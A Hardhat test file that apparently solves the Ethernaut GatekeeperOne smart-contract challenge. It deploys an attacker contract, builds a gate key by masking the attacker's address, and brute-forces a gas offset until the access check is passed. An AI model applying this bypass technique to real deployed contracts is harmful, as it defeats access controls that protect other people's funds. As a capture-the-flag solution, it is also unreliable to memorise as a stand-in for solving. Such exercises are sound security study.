import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('GatekeeperOne', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory('GatekeeperOne');
    contract = await Factory.connect(owner).deploy();
    await contract.deployed();
  });

  it('attack', async () => {
    const AttackerFactory = await ethers.getContractFactory(
      'GatekeeperOneAttacker'
    );
    const attackerContract = await AttackerFactory.connect(attacker).deploy(
      contract.address
    );

    for (let i = 0; i < 8191; i++) {
      // console.log(i);
      try {
        const mask = '0xffffffff0000ffff';
        const shortAddress = `0x${attacker.address.slice(
          attacker.address.length - 16,
          attacker.address.length
        )}`;
        const gateKey = BigNumber.from(shortAddress).and(mask);

        const tx = await attackerContract.enter(i, BigNumber.from(gateKey));
        await tx.wait();
        break;
      } catch (err) {}
    }

    expect(await contract.entrant()).to.eq(attacker.address);
  });
});
